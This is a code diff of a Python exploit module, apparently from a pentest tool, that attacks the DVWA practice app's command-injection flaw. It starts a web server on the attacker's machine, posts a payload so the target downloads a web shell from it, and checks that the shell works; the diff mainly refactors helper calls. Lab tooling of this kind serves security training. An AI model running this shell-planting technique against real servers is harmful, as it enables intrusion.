@@ -1,23 +1,23 @@
 
 import requests
-import random
 import time
 from core.network import *
 from core.common import *
-from urllib.parse import urljoin,urlparse,urlencode
+from urllib.parse import urljoin,urlparse
+
 
 def exploit(url,cookies = {}):
     print("Try Dvwa Rce exploit :")
     
-    # Start the http server for get up.php from attacker machine
+    # Start the http server for get shell from attacker machine
     host = urlparse(url).hostname
-    ip = ip_on_same_network(host) if ip_on_same_network(host) else get_public_ip()
+    ip = get_my_ip(host)
     port = 8000
     
     server = WebServer(host,port)
     server.run()
 
-    shell_name = str(random.randint(11111,99999))
+    shell_name = random_shell_name()
     headers = makeHeaders(host)
 
     payload = {
@@ -34,7 +34,7 @@ def exploit(url,cookies = {}):
     requests.post(full_url,cookies=cookies,headers=headers,data=payload)
     server.stop()
     
-    shell_path = urljoin(full_url,shell_name + '.php')
+    shell_path = urljoin(full_url,shell_name)
     check_exploit_succeed(shell_path,headers,'\t')
 
     print()
